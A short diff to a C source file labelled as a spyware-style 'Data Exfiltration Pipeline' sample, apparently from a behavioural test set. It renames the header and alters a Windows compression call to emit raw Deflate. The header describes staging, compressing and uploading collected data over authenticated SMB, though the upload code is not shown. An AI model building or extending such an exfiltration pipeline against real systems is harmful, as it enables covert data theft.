@@ -1,5 +1,5 @@
 /*
-   A04_4d: Spyware Data Pipeline Control Sample (Staging + Compression + Direct UNC Auth Variant)
+   A04_4d: Data Exfiltration Pipeline (Staging + Compression + Direct UNC Auth Variant)
    Behavioral Scope: Local metric aggregation, native memory compression, direct UNC authenticated SMB upload.
 */
 
@@ -58,7 +58,8 @@ BYTE *compress_payload(const char *input_data, DWORD input_size, DWORD *compress
     BYTE *compressed_buffer = NULL;
     SIZE_T required_buffer_size = 0;
 
-    if (!CreateCompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &compressor))
+    // Adding COMPRESS_RAW strips all proprietary Microsoft headers and outputs standard Deflate
+    if (!CreateCompressor(COMPRESS_ALGORITHM_MSZIP | COMPRESS_RAW, NULL, &compressor))
     {
         printf("[ERROR] CreateCompressor failed. Error: %lu\n", GetLastError());
         return NULL;
